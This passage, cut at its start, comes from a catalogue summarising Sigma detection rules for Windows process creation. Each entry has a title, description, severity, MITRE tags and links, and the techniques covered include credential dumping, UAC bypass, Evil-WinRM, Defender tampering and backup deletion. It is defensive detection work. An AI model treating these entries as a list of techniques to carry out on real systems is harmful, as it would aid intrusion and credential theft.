* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_task_folder_evasion.yml
* https://twitter.com/subTee/status/1216465628946563073

* https://gist.github.com/am0nsec/8378da08f848424e4ab0cc5b317fdd26

    
### Office Applications Spawning Wmi Cli
    
    Initial execution of malicious document calls wmic to execute the file with regsvr32

    * Level: high
    * MITRE: attack.t1204.002
    * MITRE: attack.t1047
    * MITRE: attack.t1218.010
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_office_spawning_wmi_commandline.yml
* https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/

* https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml

    
### WinRM Access with Evil-WinRM
    
    Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_evil_winrm.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.006/T1021.006.md#atomic-test-3---winrm-access-with-evil-winrm

* https://github.com/Hackplayers/evil-winrm

    
### Run Whoami Showing Privileges
    
    Detects a whoami.exe executed with the /priv command line flag instructing the tool to show all current user privieleges. This is often used after a privilege escalation attempt.

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.discovery
    * MITRE: attack.t1033
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_whoami_priv.yml
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami

    
### Meterpreter or Cobalt Strike Getsystem Service Start
    
    Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service starting

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1134.001
    * MITRE: attack.t1134.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_meterpreter_or_cobaltstrike_getsystem_service_start.yml
* https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment

* https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

    
### Process Dump via Comsvcs DLL
    
    Detects process memory dump via comsvcs.dll and rundll32

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_comsvcs_procdump.yml
* https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/

* https://twitter.com/SBousseaden/status/1167417096374050817

    
### Emotet Process Creation
    
    Detects all Emotet like process executions that are not covered by the more generic rules

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_emotet.yml
* https://app.any.run/tasks/e13ab713-64cf-4b23-ad93-6dceaa5429ac/

* https://app.any.run/tasks/81f3c28c-c686-425d-8a2b-a98198d244e1/

* https://app.any.run/tasks/97f875e8-0e08-4328-815f-055e971ba754/

* https://app.any.run/tasks/84fc9b4a-ea2b-47b1-8aa6-9014402dfb56/

    
### IIS Native-Code Module Command Line Installation
    
    Detects suspicious IIS native-code module installations via command line

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_iss_module_install.yml
* https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/

    
### Proxy Execution Via Explorer.exe
    
    Attackers can use explorer.exe for evading defense mechanisms

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_explorer.yml
* https://twitter.com/CyberRaiju/status/1273597319322058752

    
### Suspicious Execution of Shutdown
    
    Use of the commandline to shutdown or reboot windows

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1529
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_shutdown.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown

    
### Renamed PsExec
    
    Detects the execution of a renamed PsExec often used by attackers or malware

    * Level: high
    * MITRE: car.2013-05-009
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_renamed_psexec.yml
* https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/megacortex-ransomware-spotted-attacking-enterprise-networks

    
### Cmdkey Cached Credentials Recon
    
    Detects usage of cmdkey to look for cached credentials

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_cmdkey_recon.yml
* https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation

* https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx

    
### Pingback Backdoor
    
    Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1574.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_pingback_backdoor.yml
* https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel

* https://app.any.run/tasks/4a54c651-b70b-4b72-84d7-f34d301d6406

    
### UAC Bypass WSReset
    
    Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_bypass_wsreset.yml
* https://lolbas-project.github.io/lolbas/Binaries/Wsreset/

* https://github.com/hfiref0x/UACME

* https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf

    
### Audio Capture via SoundRecorder
    
    Detect attacker collecting audio via SoundRecorder application.

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1123
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_soundrec_audio_capture.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md

* https://eqllib.readthedocs.io/en/latest/analytics/f72a98cb-7b3d-4100-99c3-a138b6e9ff6e.html

    
### Excel Proxy Executing Regsvr32 With Payload
    
    Excel called wmic to finally proxy execute regsvr32 with the payload. An attacker wanted to break suspicious parent-child chain (Office app spawns LOLBin).But we have command-line in the event which allow us to "restore" this suspicious parent-child chain and detect it. Monitor process creation with "wmic process call create" and LOLBins in command-line with parent Office application processes.

    * Level: high
    * MITRE: attack.t1204.002
    * MITRE: attack.t1047
    * MITRE: attack.t1218.010
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_office_from_proxy_executing_regsvr32_payload.yml
* https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/

* https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml

    
### UAC Bypass Tool UACMe
    
    Detects execution of UACMe (a tool used for UAC bypass) via default PE metadata

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hktl_uacme_uac_bypass.yml
* https://github.com/hfiref0x/UACME

    
### VeeamBackup Database Credentials Dump
    
    Detects dump of credentials in VeeamBackup dbo

    * Level: high
    * MITRE: attack.collection
    * MITRE: attack.t1005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_sqlcmd_veeam_dump.yml
* https://thedfirreport.com/2021/12/13/diavol-ransomware/

* https://forums.veeam.com/veeam-backup-replication-f2/recover-esxi-password-in-veeam-t34630.html

    
### DarkSide Ransomware Pattern
    
    Detects DarkSide Ransomware and helpers

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1204
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mal_darkside_ransomware.yml
* https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html

* https://app.any.run/tasks/8b9a571b-bcc1-4783-ba32-df4ba623b9c0/

* https://www.joesandbox.com/analysis/411752/0/html#7048BB9A06B8F2DD9D24C77F389D7B2B58D2

    
### Gpresult Display Group Policy Information
    
    Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1615
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_gpresult.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1615/T1615.md

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult

* https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/

* https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf

    
### Tor Client or Tor Browser Use
    
    Detects the use of Tor or Tor-Browser to connect to onion routing networks

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1090.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_tor_browser.yml
* https://www.logpoint.com/en/blog/detecting-tor-use-with-logpoint/

    
### Suspicious GUP Usage
    
    Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_gup.yml
* https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html

    
### Terminal Service Process Spawn
    
    Detects a process spawned by the terminal service server process (this could be an indicator for an exploitation of CVE-2019-0708)

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1210
    * MITRE: car.2013-07-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_termserv_proc_spawn.yml
* https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/

    
### WMI Uninstall An Application
    
    Uninstall an application with wmic

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_wmic_remove_application.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md#atomic-test-10---application-uninstall-using-wmic

    
### PowerShell Web Download and Execution
    
    Detects suspicious ways to download files or content using PowerShell

    * Level: high
    * MITRE: attack.t1546.013
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_download_iex.yml
* https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/main/Download-Cradles.cmd

    
### Application Whitelisting Bypass via DLL Loaded by odbcconf.exe
    
    Detects defence evasion attempt via odbcconf.exe execution to load DLL

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.008
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_odbcconf.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml

* https://twitter.com/Hexacorn/status/1187143326673330176

    
### Suspicious File Download via CertOC.exe
    
    Detects when a user downloads file by using CertOC.exe

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_certoc_download.yml
* https://lolbas-project.github.io/lolbas/Binaries/Certoc/

    
### Windows Network Enumeration
    
    Identifies attempts to enumerate hosts in a network using the built-in Windows net.exe tool.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1018
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_net_enum.yml
* https://eqllib.readthedocs.io/en/latest/analytics/b8a94d2f-dc75-4630-9d73-1edc6bd26fff.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md

    
### CrackMapExec Process Patterns
    
    Detects suspicious process patterns found in logs when CrackMapExec is used

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_crackmapexec_patterns.yml
* https://mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials/dump-lsass

    
### Detection of PowerShell Execution via Sqlps.exe
    
    This rule detects execution of a PowerShell code through the sqlps.exe utility, which is included in the standard set of utilities supplied with the MSSQL Server. Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1127
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_use_of_sqlps_bin.yml
* https://docs.microsoft.com/en-us/sql/tools/sqlps-utility?view=sql-server-ver15

* https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqlps/

* https://twitter.com/bryon_/status/975835709587075072

    
### Change PowerShell Policies to an Unsecure Level
    
    Detects use of executionpolicy option to set a unsecure policies

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_set_policies_to_unsecure_level.yml
* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.1

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.1

* https://adsecurity.org/?p=2604

* https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/

    
### Audio Capture via PowerShell
    
    Detects audio capture via PowerShell Cmdlet.

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1123
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_audio_capture.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md

* https://eqllib.readthedocs.io/en/latest/analytics/ab7a6ef4-0983-4275-a4f1-5c6bd3c31c23.html

    
### Empire PowerShell Launch Parameters
    
    Detects suspicious powershell command line parameters used in Empire

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_empire_launch.yml
* https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165

* https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191

* https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178

* https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64

    
### Compress Data and Lock With Password for Exfiltration With 7-ZIP
    
    An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1560.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_7z.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md

    
### Defrag Deactivation
    
    Detects the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1053.005
    * MITRE: attack.s0111
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_slingshot.yml
* https://securelist.com/apt-slingshot/84312/

    
### Network Reconnaissance Activity
    
    Detects a set of suspicious network related commands often used in recon stages

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1087
    * MITRE: attack.t1082
    * MITRE: car.2016-03-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_recon_net_activity.yml
* https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/

    
### Suspicious Rundll32 Activity Invoking Sys File
    
    Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_sys.yml
* https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/

    
### Registry Defender Tampering
    
    Detects reg command lines that disable certain important features of Microsoft Defender

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_reg_defender_tampering.yml
* https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/

    
### Stop Or Remove Antivirus Service
    
    Adversaries may disable security tools to avoid possible detection of their tools and activities by stopping test service

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_service_modification.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

    
### Disable of ETW Trace
    
    Detects a command that clears or disables any ETW trace log which could indicate a logging evasion.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070
    * MITRE: attack.t1562.006
    * MITRE: car.2016-04-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_etw_trace_evasion.yml
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil

* https://abuse.io/lockergoga.txt

* https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63

    
### Exports Registry Key To a File
    
    Detects the export of the target Registry key to a file.

    * Level: low
    * MITRE: attack.exfiltration
    * MITRE: attack.t1012
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_regedit_export_keys.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml

* https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f

    
### Cmd Stream Redirection
    
    Detects the redirection of an output stream of / within a Windows command line session

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_redirect_to_stream.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md#atomic-test-3---create-ads-command-prompt

    
### QBot Process Creation
    
    Detects QBot like process executions

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1059.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_qbot.yml
* https://twitter.com/killamjr/status/1179034907932315648

* https://app.any.run/tasks/2e0647b7-eb86-4f72-904b-d2d0ecac07d1/

    
### WScript or CScript Dropper
    
    Detects wscript/cscript executions of scripts located in user directories

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.005
    * MITRE: attack.t1059.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_script_dropper.yml
    
### Remove Windows Defender Definition Files
    
    Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_remove_windows_defender_definition_files.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

* https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/

    
### Suspicious ftp.exe
    
    Detects renamed ftp.exe, ftp.exe script execution and child processes ran by ftp.exe

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_ftp.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ftp.yml

    
### Logon Scripts (UserInitMprLogonScript)
    
    Detects creation or execution of UserInitMprLogonScript persistence method

    * Level: high
    * MITRE: attack.t1037.001
    * MITRE: attack.persistence
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_logon_scripts_userinitmprlogonscript_proc.yml
* https://attack.mitre.org/techniques/T1037/

    
### F-Secure C3 Load by Rundll32
    
    F-Secure C3 produces DLLs with a default exported StartNodeRelay function.

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_c3_load_by_rundll32.yml
* https://github.com/FSecureLABS/C3/blob/master/Src/NodeRelayDll/NodeRelayDll.cpp#L12

    
### Suspicious PowerShell Parameter Substring
    
    Detects suspicious PowerShell invocation with a parameter substring

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_susp_parameter_variation.yml
* http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier

    
### Invoke-Obfuscation COMPRESS OBFUSCATION
    
    Detects Obfuscated Powershell via COMPRESS OBFUSCATION

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_compress.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Winword.exe Loads Suspicious DLL
    
    Detects Winword.exe loading of custmom dll via /l cmd switch

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_winword_dll_load.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherMSBinaries/Winword.yml

    
### ShimCache Flush
    
    Detects actions that clear the local ShimCache and remove forensic evidence

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_shimcache_flush.yml
* https://medium.com/@blueteamops/shimcache-flush-89daff28d15e

    
### APT29
    
    This method detects a suspicious PowerShell command line combination as used by APT29 in a campaign against U.S. think tanks.

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.g0016
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_apt29_thinktanks.yml
* https://www.microsoft.com/security/blog/2018/12/03/analysis-of-cyberattack-on-u-s-think-tanks-non-profits-public-sector-by-unidentified-attackers/

* https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html

    
### Wbadmin Delete Systemstatebackup
    
    Deletes the Windows systemstatebackup using wbadmin.exe.
This technique is used by numerous ransomware families.
This may only be successful on server platforms that have Windows Backup enabled.


    * Level: high
    * MITRE: attack.impact
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_delete_systemstatebackup.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell

    
### Suspicious Add Scheduled Task From User AppData Temp
    
    schtasks.exe create task from user AppData\Local\Temp

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_schtasks_user_temp.yml
* malware analyse https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04

    
### PsExec/PAExec Escalation to LOCAL SYSTEM
    
    Detects suspicious flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights

    * Level: high
    * MITRE: attack.develop_capabilities
    * MITRE: attack.t1587.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_psexex_paexec_escalate_system.yml
* https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

* https://www.poweradmin.com/paexec/

* https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html

    
### Renamed PAExec
    
    Detects suspicious renamed PAExec execution as often used by attackers

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_renamed_paexec.yml
* https://www.poweradmin.com/paexec/

    
### Encoded PowerShell Command Line
    
    Detects specific combinations of encoding methods in the PowerShell command lines

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_cmdline_specific_comb_methods.yml
* https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65

    
### UAC Bypass Using ChangePK and SLUI
    
    Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_bypass_changepk_slui.yml
* https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b

* https://github.com/hfiref0x/UACME

* https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf

    
### Format.com FileSystem LOLBIN
    
    Detects the execution of format.com with a suspicious filesystem selection that could indicate a defense evasion activity in which format.com is used to load malicious DLL files or other programs

    * Level: high
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_format.yml
* https://twitter.com/0gtweet/status/1477925112561209344

* https://twitter.com/wdormann/status/1478011052130459653?s=20

    
### Netsh RDP Port Forwarding
    
    Detects netsh commands that configure a port forwarding of port 3389 used for RDP

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.t1090
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_netsh_port_fwd_3389.yml
* https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html

    
### Wlrmdr Lolbin Use as Laucher
    
    Detects use of Wlrmdr.exe in which the -u parameter is passed to ShellExecute

    * Level: medium
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbin_wlrmdr.yml
* https://twitter.com/0gtweet/status/1493963591745220608?s=20&t=xUg9DsZhJy1q9bPTUWgeIQ

    
### Suspicious Listing of Network Connections
    
    Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1049
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_network_listing_connections.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md#atomic-test-1---system-network-connections-discovery

    
### Non-privileged Usage of Reg or Powershell
    
    Search for usage of reg or Powershell by non-priveleged users to modify service configuration in registry

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_non_priv_reg_or_ps.yml
